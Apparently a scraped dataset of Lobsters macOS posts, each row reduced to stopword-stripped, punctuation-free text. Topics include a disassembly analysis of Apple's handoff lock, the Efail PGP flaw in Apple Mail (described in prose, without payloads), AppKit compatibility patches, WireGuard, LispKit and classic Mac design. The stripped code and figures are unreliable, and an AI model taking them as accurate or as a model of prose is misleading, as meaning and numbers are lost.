usrlibsystemlibsystemplatformdylib libsystemplatformdisasmout stored whole output file hoping work closely symbol string result saw surprise output file line used search find oslocklock found oslocklock movq rdi rax ff jmpq rax yes line asm code definitely full implementation lock get code first thing check syntax type used code nowadays intel syntax determine syntax type look presence prefix register register syntax important syntax type order source destination register case type use initial operand source following line could read move quad word address stored rdi save rax movq rdi rax using abi could find rdi used pas argument function recalling usage lock function objectivec source code confirms point oslocklock mlock rdi contains actual allocated lock data refered oslockhandoffs pointer next line describes current execution transfered another point via jump specific address calculated expression rax two part expression first part calculated value using socalled baserelative address mode rax could read value memory location eight byte address indicated rax know rax contains actual lock data combining two fact together assume lock kind struct contains lock function unfortunately say search oslockhandoffs produce result le similar type found nm usrlibsystemlibsystemplatformdylib grep handoff data const external oslocktypehandoff still stored value meaning investigation know decode otool dv data const usrlibsystemlibsystemplatformdylib currently explicit call lock function example assume lock function somewhere library loaded library started lock searching got result probably efficient way guess found lock word used main part function name also prefix probably trylock may better nm usrlibsystemlibsystemplatformdylib grep trylock text text nonexternal private external oslockelidingtrylock text text nonexternal private external oslockhandofftrylock text text nonexternal private external oslocknospintrylock text text nonexternal private external oslockspintrylock text text nonexternal private external oslocktransactionaltrylock text text nonexternal private external oslocktransactionaltrylock variant rtm text text nonexternal oslocktransactionaltrylockabort text text nonexternal private external oslockunfairtrylock text text external osnospinlocktrylock text text external oslocktrylock text text external osunfairlocktrylock see multiple version try lock compatible name oslockhandofftrylock oslockhandofftrylock movl ecx xorl eax eax lock cmpxchgl ecx rdi sete al retq key operation code lock cmpxchgl instruction compare operand load one operand destination eax register lock attribute provides atomic behaviour almost implementation oslockhandofflock key difference code last line cmpxchgl able load rdi conditional jump performed jne oslockhandofflock movl ecx xorl eax eax lock cmpxchgl ecx rdi jne retq jmp oslockhandofflockslow move oslockhandofflockslow label oslockhandofflockslow pushq rbp movq rsp rbp pushq pushq pushq pushq pushq rbx pushq rax movq rdi movl addq movl ebx movl movl jmp testl movl ecx cmovel ecx ebx movl eax edi movl ebx esi movl edx callq symbol stub threadswitch cmpl ebx sete al movzbl al eax addl eax incl movl eax testl eax eax jne xorl eax eax lock cmpxchgl je cmpl eax jne movl edi callq oslockrecursiveabort addq rsp popq rbx popq popq popq popq popq rbp retq nop see disassembled code slow path quite difficult reading use hopper disassemble convert pseudo code int oslockhandofflockslow int rbx goto rax rax goto rax lock intrinsiccmpxchg goto rax goto rax oslockrecursiveabort return rax return rax rbx threadswitch rax rbx rbx goto one interested u flow next threadswitch flow defined either comparison via cmpxchg exit code main interest u threadswitch procedure going look threadswitch symbol string defined usrlibsystemlibsystemkerneldylib syscallthreadswitch mov rcx code xrefthreadswitch mov eax syscall ret clear threadswitch peformed via syscall importand address threadswitch function declared xnu hybrid core o x usually syscalls mapped kind table system call address assumed approach converted decimal number search internet found table list mach trap machreplyport threadselftrap threadswitch http one source information could xnu man page threadswitch function provides lowlevel access scheduler context switching code newthread hint implement handoff scheduling operating system attempt switch directly new thread bypassing normal logic selects next thread run possible since hint may incorrect ignored specify thread host current thread scheduler switch thread ie runable already running another processor case normal logic select next thread run used current thread may continue running appropriate thread run handoff implementation lock constantly trying switch thread inside loop way perform lock switching thread trivial task implemented via syscalls definition fast comparing basic instruction general case better try lock course proof much accurate seems fit existing picture summary based explicit implicit method approach found difference trylock lock method make reasonable use trylock first however rare technique tends think lock implementation could improved useful nowadays actually seems one guess true checked recent source code moment find trylock retain implementation simple lockunlock pair used however oslockhandoff used anymore currently replaced osunfairlock new lock available since macos reference
305,Lobsters,mac,Apple macOS,"In Apple Mail, There’s No Protecting PGP-Encrypted Messages",https://theintercept.com/2018/05/25/in-apple-mail-theres-no-protecting-pgp-encrypted-messages/,apple mail protecting pgpencrypted message,nearly published paper gpgtools blog post completely disabling pgp thunderbird enigmail view message body plain text two week efail history email account email server spying internet blog post confirmed gpgtools exploit think pgp problem smime much worse gpgtools enigmail fix efail vulnerability month ago timeline discovered discovered giving encrypted email option debian early stage blowing whistle correction may,update since article published gpgtools released version appears successfully mitigate openpgp efail attack macos high sierra user use macos high sierra apple mail gpgtools safe use pgp update latest version everything use older version macos gpgtools still vulnerable nearly two week since group european researcher published paper describing efail set critical software vulnerability allow encrypted email message stolen within inbox developer email client encryption plugins still scrambling come permanent fix apple mail email client come free every mac computer open source project called gpgtools allows apple mail smoothly encrypt decrypt message using pgp standard day efail paper published gpgtools instructed user workaround efail changing setting apple mail disable loading remote content similarly creator pgp phil zimmermann cosigned blog post thursday stating efail easy mitigate disabling loading remote content gpgtools even follow advice disable remote content apple mail gpgtools still vulnerable efail developed proofofconcept exploit work apple mail gpgtools even remotecontent loading disabled german security researcher hanno böck also deserves much credit exploit reported vulnerability gpgtools developer actively working update plan releasing soon short video demonstrates dangerous exploit could apple mail user relies pgpencrypted email completely disabling pgp time like electronic frontier foundation eff recommends option best course action temporarily stop using apple mail switch thunderbird least gpgtools release update fix issue thunderbird open source email client work mac latest version enigmail plugin add pgp support thunderbird successfully mitigates efail attack least far publicly known using thunderbird also configure view email plaintext format instead html format disabling html email prevent maybe future variant attack working clicking view message body plain textunfortunately apple mail option disable viewing html email two week efail history nutshell efail attack work like first attacker need copy message encrypted public key could get hacking email account hacking email server compelling email provider hand warrant intercepting spying internet way pgp specifically designed protect promise pgp even attacker copy encrypted message decrypt receive email encrypted public key email client automatically us secret key decrypt read efail researcher discovered could craft special email secretly includes stolen encrypted message within send receive malicious email email client us secret key automatically decrypt pilfered message within malicious email sends decrypted copy stolen message back attacker example web request load image email one click mean lose thing pgp supposed protect may research team behind efail published paper point thunderbird enigmail apple mail gpgtools vulnerable user using default setting day eff published blog post stating proofofconcept exploit provided efail paper one implementation new type attack variant may follow coming day eff advising pgp user pause use tool seek mode secure endtoend communication advice uninstall pgp software situation resolved caused controversy digital security world nonprofit space pushed back eff stance like blog post privacy international blog post american civil liberty union opinion side make good point also worked previously eff also may gpgtools tweeted instruction work around vulnerability disable loading remote content email first appeared mitigate problem reality like eff predicted gpgtools still vulnerable variant efail exploit exploit demonstrates may enigmail released update mitigated efail vulnerability turn mitigation work either following day böck german security researcher tweeted found trivial bypass enigmail new version disclosed bypass enigmail developer could fix iton may enigmail released yet another update mitigate efail twitter böck confirmed new version actually prevents exploit working adding still happy mitigation disabling html mail still good idea gpgtools exploit personally know many journalist free software developer activist around world rely apple mail gpgtools encrypted email daily basis decided write efail exploit apple mail initial exploit announced may worked user clicked load remote content buttonlater became curious böck technique bypass enigmail initial efail fix would work apple mail gpgtools even suggested mitigation enigmail released patch agreed privately share technique took minute modify initial exploit work apple mail gpgtools well even remotecontent loading disabled soon confirmed exploit worked recorded little video showing working disclosed vulnerability gpgtools developer order make sure whatever update working block variant attack well since creating video discovered separate simple variant efail attack also work gpgtools remote content disabled hopefully gpgtools release update soon fix issue detail efail vulnerability public week related exploit relatively simple likely others already discovered decided public interest warn apple mail pgp user sooner rather later currently available mitigation efail especially true security expert falsely claiming disabling remote content apple mail mitigate problem statement cosigned zimmermann also cosigned founder enigmail encrypted email service protonmail mailvelope browser addon encrypted webmaildespite several month lead time enigmail gpgtools project failed fix efail vulnerabilitiesone difference efail variant proofofconcept researcher published paper user need click something get exploited think lot nonexpert user thing like click link receive trusted sender said matthew green cryptography professor john hopkins university feel comfortable safe worry losing data attacker expects people could find efail exploit email client efail variant pretty serious sense one click mean lose thing pgp supposed protect eff international director danny brien said nothing defend apart remembering never click anything email ever even enigmail update eff confident pgp safe rely yet getting safer want stress everybody pgp ecosystem working problem every day exploiting efail get harder brien said two week ago need click efail work latest update enigmail thunderbird security researcher like hanno böck still trigger take social engineering single click added donating project like gpgtools enigmail would help people almost volunteer think pgp problem smime much worse go detail efail affect pgp ecosystem want take moment discus smime different encrypted email standard far vulnerable attack described efail paper pgp also present obstacle mitigationunlike pgp decentralized us model called web trust user deal key management identity verification making pgp notoriously confusing smime us certificate authority organization like employer centrally manages identity verification user making smime ideal deploying encrypted email large organization smime widely deployed bank major corporation government agency around world including u department defense built major email client including outlook default email apps macos io android without requiring plugin time writing far tell email client released update mitigates efail smime leaving smime user currently vulnerable attack reason focusing primarily pgp instead smime community work using year gpgtools enigmail fix efail vulnerability month ago efail demonstrated bad encrypted email ecosystem responding vulnerability timely matter according timeline compiled security researcher thomas ptacek enigmail first notified efail research november gpgtools first notified february yet may researcher published paper project still vulnerable compare recent pair vulnerability found signal desktop earlier month researcher discovered remote code execution hackerspeak bad vulnerability signal desktop may disclosed developer may later day signal developer fixed problem released update fix complete may researcher discovered second way exploiting vulnerability hour later disclosed developer le two hour new signal desktop update released finally solved problem signal desktop automatically update nearly user gotten update day released despite several month lead time enigmail gpgtools project failed fix efail vulnerability paper made public likelihood majority pgp user probably still vulnerable two week later fair enigmail gpgtools developer much harder job signal developer one side must work ancient crypto system pgp date standardized openpgp popular pgpmime system first standardized side must deal ancient messaging system email constructed travel including message sending protocol smtp first standardized mime standard attachment emerged also need ensure software work seamlessly pgp software diversity standard contain multitude obsolete often insecure feature order maintain backwards compatibility signal developer deal decade technical baggage handle dozen possible message format instead one would take hour fix similar vulnerability based temporary conservative stopgap eff suggests uninstall disable pgp switch secure messaging apps like signal wire encrypted email ecosystem solves efail problem sound like pretty solid advice unfortunately many u simple giving encrypted email option several community user grown dependent encrypted email get daily work done including civil society community like human right internet freedom activist hacker open source developer community like debian project increasingly journalist researcher collaborate work sensitive source secure messaging apps substitute email never keep old archive email search archive year later need look something email participate mailing list threaded conversation forward message around leave thing marked unread time deal publish blog post article academic paper people email feedback might time reply right away definitely want feedback making phone buzz amsecure messaging apps substitute email never befor many u maintaining email habit sending without encryption simply viable option asking u temporarily stop using pgp asking u stop using email practical without completely changing working year fact email pgp based open standard make difficult maintain fix security vulnerability also add enormous benefit email server interoperate send encrypted email theinterceptcom address gmailcom address able read never able send message wire account signal account email open federated system around long internet everyone email address people use signal others use wire whatsapp telegram reachable facebook none system work imagination exists brand new emaillike system us modern cryptography like signal support single sane messaging format instead endless permutation quality email like ability maintain organize archive old message different server communicate decade cruft maintain importantly impossible use insecurely since emaillike system exists imagination reality stuck pgp moment one pgpdependent people like make sure pay close attention efail development always keep software uptodate possible disable viewing html email one people mean use signal similar messaging apps need communicate securely also possible biased would entirely different life right pgp january received pgpencrypted email anonymous stranger friend email read decrypted need get information securely laura poitras alone find emailgpg key help know time stranger edward snowden early stage blowing whistle national security agency correction may earlier version story incorrectly stated copy encrypted email could obtained via national security letter subpoena search warrant required message content
306,Lobsters,mac,Apple macOS,Today Mac OS X is as old as the Classic Mac OS,https://sixcolors.com/post/2018/05/today-mac-os-x-is-as-old-as-the-classic-mac-os/,today mac o x old classic mac o,jason snell today mac o x old classic mac o funeral mac o another one may way appreciate article like one support u becoming six color subscriber subscriber get access exclusive podcast membersonly story special community,jason snell may pt today mac o x old classic mac o bit numerology today mark year one month day since mac o x released march strangely odd also happens exact length time january launch original macintosh march word today mac second operating system era powered mac o x macos existence long first era plenty caveat mac o x public beta funeral mac o held classic mode continued function within mac o x removed mac o x leopard still milestone make wonder come next mac doubt see seismic transition new mac likely see wave change gradually turn think mac something different influenced success io perhaps time right apple make mac chip transition every dozen year another one may way happened probably happen appreciate article like one support u becoming six color subscriber subscriber get access exclusive podcast membersonly story special community
307,Lobsters,mac,Apple macOS,"These 299 macOS apps are so buggy, Apple had to fix them in AppKit",https://worthdoingbadly.com/appkitcompat/,macos apps buggy apple fix appkit,full list bundle id csv format learned stroughtonsmith may may asked checkfixes apps patch look like raymond chen stuff noticed list apps automatic tabbing app list february jul commit io examined slaunchaman ida free script also look xrefs found html csv conclusion get bad reputation learned η advice post,photoshop matlab panic transmit eclipse common among apps macos applies compatibillity fix full list bundle id along function check first caller function also available csv format note list apps apple developed compatibility tweak make run newer macos version list demonstrates even best apps often need tweak newer macos addition patch applied older version apps extracted list interesting thing found learned browsing stroughtonsmith twitter feed saw tweet know really made nsimage explicitly check bundle adam bell may interesting always thought apple thorough compatibility microsoft later reply dropped even crazier tidbit appkit hundred bundle id check various reason guilherme rambo inside may hundred got ta take look others asked turn apple call checkfixes internally apps compatibility fix applied checking bool cfappversionchecklessthan cfstringref cfsystemversion function return true current app match specified bundle id linked prior macos version thus older version app would fix applied newer version built newer sdk would found unique app id passed cfappversionchecklessthan statically analyzing appkit foundation corefoundation macos apple top list unique app id expected since apple likely used trick private apis third party use causing compatibility issue line adobe course second place bundle id looking list apps tell lot apps apple considers essential mac platform put special effort make work newer system version apps apple consider important productivity apps large company adobe suite microsoft office suite autodesk autocad maya matlab ableton live intuit quickenquickbooks turbocad vmware fusion communication apps google chrome opera browser twitter mac tencent qq wechat aol messenger citrix gotomeeting cisco spark hipchat sketch spotify evernote dropbox surprisingly high number game suspect even id gamespecific library opengl blizzard game installer diablo hero storm starcraft world warcraft hearthstone battlenet grid reloaded dragon age course opensource apps firefox vlc blender eclipse aquamacs emacs port openjdk textual irc indie favorite panic coda transmit omni group omnifocus omnigraffle omniplan omniweb sketch bbedittextwrangler device driver manufacturer gon na fix em garmin trainingcenter epson hp installer fujitsu scansnap apple internal apps comappleistmerlin probably ironic comappleistsoftwaredepotchecker comappleisthrmerlin many apps heard breadth software staggering show much testing apple must discover bug instead testing say clicktoroot bug high sierra patch look like patch change behaviour drastically crazy window backward compatibility patch raymond chen writes patch nsopenglcontextcurrentcontext example simple ida graph view function attempt translating pseudocode make clear compatibility change adding autoreleasepool class nsopenglcontext class func currentcontext nsopenglcontext cfappversionchecklessthan commicrosoftpowerpoint cfsystemversionyosemite autoreleasepool let cglcontext cglgetcurrentcontext pthreadmutexlock nsopenglcontexttocglcontextobjmaplock let context nsopenglcontexttocglcontextobjmap cglcontext pthreadmutexunlock nsopenglcontexttocglcontextobjmaplock return context else autorelease pool let cglcontext cglgetcurrentcontext pthreadmutexlock nsopenglcontexttocglcontextobjmaplock let context nsopenglcontexttocglcontextobjmap cglcontext pthreadmutexunlock nsopenglcontexttocglcontextobjmaplock return context patch similarily small dragon age patch found make nsbundle imageforresource call bundle pathforimageresource instead bundle urlsforimageresource creates image using file instead url stuff noticed list apps microsoft excelpowerpointword patch cfarraysortvalues change sorting algorithm slightly break sorting apps automatic tabbing introduced sierra disabled using compatibility feature compatiblity patch affect apps one company example nssavepaneluselocalhosturlsdefaultvaluefunction fix save panel bunch adobe apps compatibility patch affect apps many different developer example nstableview related patch affected apps hp installer sketch teamviewer demonstrating table hardtm photoshop vectorworks cad touch bar api patch touch bar api new surposed already compatibility issue preference method named behaviour change eclipse vmware dragon age apple keynote apple motion microsoft office suite dubious honour getting patch method specifically named list system apps comappleloginwindow would need compatibility patch guess apple using compatibility system patch thingschange behaviour specific system apps done via say method swizzling app instead framework patch seems turn slower code path example apps checked likely slows core graphic using synchronous method great use backwards compatibility allows almost every app run faster newer o still prevent issue application app list two reaction someone find app fixed apple reaction developer comic life sure feel honored ashamed list airy february reaction developer textual irc fuck nsbundle emsquared committed jul textual irc example actually interesting able find commit fixed bug looking patch patch disables nsbundleunload entirely code get unloaded simply searched nsbundle textual source actually found commit fixed issue textual plugin system deactivated plugins first unloading plugin bundle calling unload handler plugin course new nsbundle implementation unload handler code would gone bundle unload calling handler would crash app fix course call unload handler deallocating bundle fascinating see side application compat patch bug manifested app worked around apple finally fixed properly developer much cursing io surprisingly io uikit zero bundle id check fix applied apps linked old sdks however found three bundle id foundation confirmed string applicationsxcodeappcontentsdeveloperplatformsiphoneosplatformdeveloperlibrarycoresimulatorprofilesruntimesiossimruntimecontentsresourcesruntimerootsystemlibraryframeworksfoundationframeworkfoundation grep com sort found compopcap examined return random resource nsbundle pathforresource oftype commackiev comstuckpixelincfunnypictures slaunchaman found app popular app app extracting data hard hour without spending dime pulled list using static analysis since dynamic analysis putting breakpoint cfappversionchecklessthan would require trigger every method containing patch impossible conduct static analysis needed scriptable disassembler chose ida free since ida industry standard reverse engineering free version support disassembling macos framework first loaded systemlibraryframeworksappkitframeworkappkit foundation corefoundation ida free next needed script looked code invokes cfappversionchecklessthan called xrefs crossreferences ida xref find argument passed function find one function call function since want know example function actually us nsbundle newimageforresourcewithprospectivename imageclass way dump information ida output window ida usually scripted using idapython free version support idc clike scripting language written one idc script consult idc script script also look xrefs addition ida renamed idc method ida older function name still present ida decided update newer name checking ida idcidc header file name mapping resulting script found loaded via file script file ida printed calling function bundle id extract properly fixed hand copied list generated html csv version python script finally count number apps took csv cut f appkitcsvsortuniqwc conclusion apple get bad reputation supposed lack backwards compatibility nothing truth macos includes tweak specific important apps keep working new o version list apps macos check fascinating show apple belief essential application platform learned backwards compatbility hard complicated user interface element hard see many many nstableview patch wide list apps affected sometimes better specialcase apps reduce performance apps see patch ida free scripting language idc bad compared idapython idaswift wen η thanks theslinker advice post
308,Lobsters,mac,Apple macOS,Alpha Snapshots of WireGuard for Android and macOS,https://lists.zx2c4.com/pipermail/wireguard/2018-May/002854.html,alpha snapshot wireguard android macos,announce alpha snapshot wireguard android macos jason http playgooglecomstoreappsdetails idcomwireguardandroid team wireguardcom http wwwwireguardcominstall information wireguard mailing list,announce alpha snapshot wireguard android macos jason donenfeld jason wed may cest hey folk gradually adding platform capable running wireguard thanks stillbuggy userspace code mathias developing today try wireguard two new platform android macos new wireguard android download app play store fdroid support adding wgquick style conf file zip app us kernel module available give best performance stability battery life fall back userspace code available download http playgooglecomstoreappsdetails idcomwireguardandroid new wireguard macos install wgquick wg wireguardgo using homebrew able run wgquick whatever familiar command used setting network manually run wireguardgo place usual linux command ip link add dev wireguard install homebrew command brew install wireguardtools future wireguard yourfavoriteplatform work progress hope nice thing announce coming week interested helping develop support particular platform please send u email team wireguardcom workhorse wireguard linux linux kernel implementation remains recommended complete wireguard implementation actively working upstreaming code kernelorg install instruction available every major distro http wwwwireguardcominstall disclaimer alpha warning securityrelated software new implementation macos android alpha quality best keep expectation low bug may even security issue nt yet certify software want let u know encounter inevitable nasty bug consider prerelease software enjoy jason information wireguard mailing list
309,Lobsters,mac,Apple macOS,LispKit: extension and scripting languages for macOS,https://github.com/objecthub/swift-lispkit,lispkit extension scripting language macos,swift lispkit overview swift small scheme standard numericalscheme lisppad lisppad library reference pdf feature racket srfi project lispkit lispkittools lispkitrepl architecture lispkit wiki commandline tool overview downloading source code compiling commandline tool swift package manager resource directory resource directory requirement,swift lispkit overview lispkit framework building lispbased extension scripting language macos application lispkit fully written programming language swift lispkit implement core language based small scheme standard extensible allowing inclusion new native library written swift new library written scheme well custom modification core environment consisting compiler virtual machine well core library far performance priority development lispkit lispkit compiler perform many code optimization performance system state art lisp scheme implementation numericalscheme demo showcase create derived lispkit interpreter inherits everything lispkit without code duplication defines new native well schemebased library lisppad implement simple lightweight integrated development environment lispkit macos cocoabased ui lisppad library reference document core lisppad lispkit library pdf form simpler commandline tool similar functionality provided lispkit framework see feature lispkit provides support following core feature many based module based library hygienic macro based syntaxrules firstclass environment callcc dynamicwind exception dynamicallyscoped parameter multiple return value delayed execution via promise stream support full numerical tower consisting arbitrary size integer rational real number inexact complex number unicode string character vector bytevectors text binary port record hashtables enumeration small library scheme base scheme caselambda scheme char scheme complex scheme cxr scheme eval scheme file scheme inexact scheme lazy scheme load scheme processcontext scheme read scheme repl scheme time scheme write scheme large library scheme red scheme tangerine edition scheme box scheme charset scheme comparator scheme generator scheme hashtable scheme ideque scheme list scheme mapping scheme rlist scheme set scheme sort scheme stream scheme text scheme vector lispkitspecific library lispkit base lispkit core lispkit control lispkit system lispkit system o lispkit box lispkit math lispkit list lispkit hashtable lispkit dynamic lispkit type lispkit vector lispkit gvector lispkit record lispkit bytevector lispkit char lispkit charset lispkit string lispkit port lispkit datetime lispkit draw lispkit draw turtle lispkit datatype lispkit object lispkit enum lispkit regexp lispkit stream lispkit graph lispkit match lispkit iterate lispkit log lispkit set lispkit stack lispkit queue lispkit heap lispkit disjointset lispkit wttree lispkit comparator lispkit combinator lispkit logic lispkit clos lispkit test lispkit prettify lispkit csv lispkit markdown lispkit sqlite lispkit json lispkit pdf lispkit incompatible incomplete respect following feature list immutable mutable conscells supported way similar racket datum comment introduced via always work scheme dialect following srfi library ported lispkit included framework project project defines three different target lispkit core interpreter framework including support file lispkittools framework tool supporting lispkit eg readevalprint framework lispkitrepl commandline tool implementing readevalprint loop architecture architectural perspective lispkit consists compiler translating lispkit expression bytecode virtual machine interpreting generated bytecode virtual machine stackbased handle tail call continuation provides garbage collector large range library packaged together framework detail found lispkit wiki commandline tool overview project also includes commandline tool called lispkit shell executing lispkit application terminal used try experiment lispkit framework commandline tool also used interactively readevalprint loop readevalprint loop par entered lispkit expression compiles bytecode executes display result downloading source code first clone lispkit repository via git following command create directory swiftlispkit git clone http githubcomobjecthubswiftlispkitgit cloning swiftlispkit remote enumerating object done remote counting object done remote compressing object done remote total delta reused delta packreused receiving object mib kib done resolving delta done next switch xcode build lispkit commandline tool via scheme lispkitrepl compiling commandline tool swift package manager debug binary built following way cd swiftlispkit swift build xswiftc xswiftc spm fetching http githubcomobjecthubswiftnumberkitgit fetching http githubcomobjecthubswiftcommandlinekitgit fetching http githubcomobjecthubswiftmarkdownkitgit completed resolution cloning http githubcomobjecthubswiftnumberkitgit resolving http githubcomobjecthubswiftnumberkitgit cloning http githubcomobjecthubswiftmarkdownkitgit resolving http githubcomobjecthubswiftmarkdownkitgit cloning http githubcomobjecthubswiftcommandlinekitgit resolving http githubcomobjecthubswiftcommandlinekitgit linking lispkitrepl debug binary run invoking builddebuglispkitrepl lispkit assuming directory documentslispkit contains copy resource directory needed run commandline tool release binary built like cd swiftlispkit swift build c release xswiftc xswiftc spm fetching http githubcomobjecthubswiftnumberkitgit fetching http githubcomobjecthubswiftcommandlinekitgit fetching http githubcomobjecthubswiftmarkdownkitgit completed resolution cloning http githubcomobjecthubswiftnumberkitgit resolving http githubcomobjecthubswiftnumberkitgit cloning http githubcomobjecthubswiftmarkdownkitgit resolving http githubcomobjecthubswiftmarkdownkitgit cloning http githubcomobjecthubswiftcommandlinekitgit resolving http githubcomobjecthubswiftcommandlinekitgit linking lispkitrepl release binary run invoking buildreleaselispkitrepl r sourceslispkitresources directory swiftlispkit binary build assuming directory documentslispkit contains copy resource directory also possible run release binary invoking buildreleaselispkitrepl lispkit requirement following technology needed build component lispkit framework building commandline tool needed swift package manager compiling framework trying commandline tool directly xcode swift package manager needed
310,Lobsters,mac,Apple macOS,Using The Old Mac OS Is Pure Zen,https://www.fastcodesign.com/90170255/using-the-old-mac-os-is-pure-zen,using old mac o pure zen,likened drug fake news abounds classic macintosh operating system distracting addicting archiveorg beautifully black white susan kare app icon turning screen black white guttural zing hyperreal hue archiveorg animation neither surprise delight riff like marching band xylophone player feel like paper cloth material replicated blackandwhite interface need flexibility,time apps likened drug fake news abounds easy pine simpler early day apple mouse graphical user interface changed world landmark macintoshtechnology age well good design age like fine bordeaux something remembered taking stroll memory lane trying classic macintosh operating system run web browser internet archive technically software version still recognize swollen trash normal mac icon know course appreciate old o computing artifact expect earnestly enjoy using felt relaxed inside rough pixel lowfi without staticky minimal without soulless quite simply felt like salve technology biggest problem somehow distracting addicting time source image aaapicturesistock photo archiveorg screenshot beautifully black whiteglancing macbook rainbow icon tray work help wonder need much color time would likely shut computer take walk outside constant array skittle screen first mac black white necessarily choice limitation hardware color requires fancier display lot processing power drive designer like susan kare learned le creating mac suite folder icon charm twocolor bitmap made graphic still remember like beloved trash smiling mac computer icon interface black white thanks handiwork feel deadcomparing work something like say drooling teethmashing app icon clash clan old mac feel like reading sunday newspaper swallowing bottle upper rushing battlefieldit coincidence small contingent smartphone user started turning screen black white suddenly red notification bubble lose guttural zing picture longer appear hyperreal hue make reality look dull comparison eye candy feel lot like eye vegetablesi tried android io feel horrible two color like app icon trapped episode love lucy black white feel great o explicitly designed using old mac pure zen screen capture archiveorg animation neither surprise delightminimize window mac today depending setting may watch disappear put whole show split second pirouette collapse sucked away like phantom ghostbusters trap quite dramatic given wanted hide document today interface whiz zoom bounce sometimes even make make pop like something mimicking score seinfeld tinder riff like marching band xylophone player get matchso old mac o work starter whenever drag around window dragging window instead pull wireframe almost surely processing power drag full graphic real time close window wireframe scale shoot whenever place first came hard disk upper right corner folder bottom left screenthis minimal wireframe effect animation mac black white approach color relaxing informational animation reminds something came put back neatly box onepart navigational cue one part marie kondo tidyism nothing nothing lessanother key point interface admitting interface trying mimic realworld physic springy inertia something like twitter pulltorefresh gesture long time assumption ui design ui mimic real world object feel real google go far argue interface feel like paper cloth material imbued super powersof course approach got u phone hundred time day always playing unlimited roll bubble tape pocket love old wireframes perfectly bored source image apple replicated idea blackandwhite interface may impractical downright silly world make sense watch youtube show browse baby photo facebook without color rich digital medium mac interface first conceived instagram recent decision ditch blue color scheme blackandwhite interface might prove idea turning back color early mac day futile care color nav bar picture still grab animation simply need flexibility world control computer touchscreen gesture rather mouse click nothing else swiping tinder mean avoid hitting wrong yes button critical moment bumpy subway ride accidentally setting hookup never want swiping great bit ui like pulling refresh twitter feed great bit ui service always always always say animation acknowledge flick shake believe old mac make timely reminder digital age always felt frantic urgent overwhelming maybe even old mac interface solution view subtle north star sensibility much able accomplish little
311,Lobsters,mac,Apple macOS,A Native Art Gallery for Your Mac,http://archagon.net/blog/2018/05/02/a-native-art-gallery-for-your-mac/,native art gallery mac,rutracker museum collection rimaginarynetwork rmuseum backgroundifier automator folder action native wallpaper cycling functionality macos backgroundifierbuddy backgroundifier free open source technical detail,challenge fit rotating art gallery somewhere life love visual art find hugely inspiring unfortunately reading art book much context switch regular distraction museum appropriate rare trip instagram help let see content artist follow still art history beyond sliver sourcing art problem year keeping fairly large folder inspiring image place imgur album rutracker museum collection rimaginarynetwork rmuseum leafing enough needed put regular random rotation place eyeshot without becoming overt distraction finally solved problem building app called backgroundifier converted arbitrarysize image wallpaper superimposing onto attractive blurred background pairing automator folder action native wallpaper cycling functionality macos could drop arbitrary image directory desktop automatically show wallpaper rotation peeking image simple invoking show desktop shortcut wanted see something new switch new space several year scheme worked perfectly fine recently collection grown image found bumping slight annoyance example way retrieve filename current wallpaper remove image rotation mark favorite every maintenance task performed manually finally decided build menu bar app would solve problem unified interface backgroundifierbuddy browser support video tag backgroundifierbuddy expects image organized two directory one containing source image containing converted backgroundified counterpart latter directory directory selected wallpaper rotation system preference start rightclicking menu bar icon show desktop rightclicking move onward next image moving cursor away icon hide desktop automatic conversion enabled image dropped source directory immediately converted wallpaper output directory long app running mean obscure folder action longer necessary automatic conversion work current wallpaper based output directory counterpart source directory number maintenance task become available grown tired image rotation click delete trash together source image want save later find need tweaking click archive delete wallpaper image move source image archive directory holding option allows archive image still keeping rotation clicking favorite add custom finder tag source image making easier locate later finally refresh wallpaper cache restarts dock seems sometimes necessary update wallpaper rotation new image toggle desktop icon show hide icon desktop better image visibility going simplicity solution simple get bogstandard o wallpaper cycling functionality helper app build basic file system command complexity hassle everything work backgroundifier still cost buck app store backgroundifierbuddy free open source find latest release enjoy technical detail although deceptively simple surface code behind backgroundifierbuddy eluded time reason public way query current wallpaper image directory selected try calling desktopimageurl nsworkspaceshared return directory displayed image past could pull info comappledesktop default longer option starting maverick wallpaper setting stored desktoppicturedb sqlite file located libraryapplication supportdock directory layout file tiny bit confusing read brief image data table associated space uuid display uuid pair unfortunately indication uuid current space might associated uuids stored order new space created moved spot becomes impossible tell one database alone needed way get uuids current space display classic way query comapplespaces default unfortunately data returned appears subtly incorrect among fault current space uuid usually date display identifier uuid outright wrong least machine get real info dictionary space call private cgscopymanageddisplayspaces function give uptodate uuids current space display uuids tow enough info run query desktoppicturedb file retrieve current wallpaper fortunately even go far sleuthing around github relevant together wallpaper found scant reference private function exactly needed desktoppicturecopydisplayforspace together cgsgetdisplayforuuid use function retrieve dictionary wallpaper info given space caveat emptor stuff might break future macos release fortunately making change private apis requesting data edit make wallpaper setting refreshing current image simply done calling public nsworkspace method setdesktopimageurl argument mirrored desktopimageurl desktopimageoptions toggle desktop icon make change comapplefinder default functionality entirely optional note sandboxing restriction allow command line call backgroundifier process image user picture directory subdirectory yet found way expand app sandbox called nonsandboxed app restriction carry selection source output directory let know know way expand app sandbox another app pose problem able find nonsandboxed commandline version backgroundifier executable zip file resource subdirectory backgroundifierapp bundle point backgroundifierbuddy preference good go arbitrary source output directory find discussion article hacker news
312,Lobsters,mac,Apple macOS,"Twenty Years Ago, Steve Jobs Introduced the iMac G3",https://512pixels.net/2018/05/20-years-imac-g3-steve-jobs/,twenty year ago steve job introduced imac,steve job introduced first imac apple press release machine design andrew gore anita epler writing macworld usb ready prime time serious internet legacy made bunch cool stuff complete imac archive aqua bondi,today mark twenty year since steve job introduced first imac video apple press release machine pretty great good thing law company monopoly good idea otherwise apple would deep yogurt idea steve job shared crowd apple flint center auditorium tuesday may instance idea get everything need explore internet everything mean include powerpc chip faster pentium machine come complete gob ram hard disk modem baset ethernet support cdrom drive monitor surround sound come bundled internet explorer aol quicken filemaker coolestlooking computer planet idea imac radical idea personal computing since macintosh go job nattily attired suit change revealed imac excitement audience palpable thing crowd eager see apple new product line snaked deanza college campus people waited flint center door open even time groped way seat inkling surprise store judging reaction whoa wonderfully apposite wordchoice ad chiatday apple ad agency created product go read whole thing lot fun design right away machine design made wave late entire computer industry defined beige box mac immune made imac curvy blue line exciting andrew gore anita epler writing macworld hard recognize imac lineage allinone case tiny footprint even integrated suggest original macintosh similarity end using translucent plastic ice bondi blue homage australian beach apple industrialdesign group created computer without single straight keyboard component curved case allows enough light suggest outline imac internal work without revealing much every piece cable key translucence curve light great effect round mouse reveals tracking ball half white half mouse motion mesmerizing adding spaceage effect apple use holographic sticker port identifier fcc tag label translucent white flipdown foot prop keyboard coordinating nicely imac aquamarine appendage design may look dated important realize big deal design seemingly overnight consumer electronics started popping blue plastic cash imac fun approachable design design new thing imac powered thenfamiliar 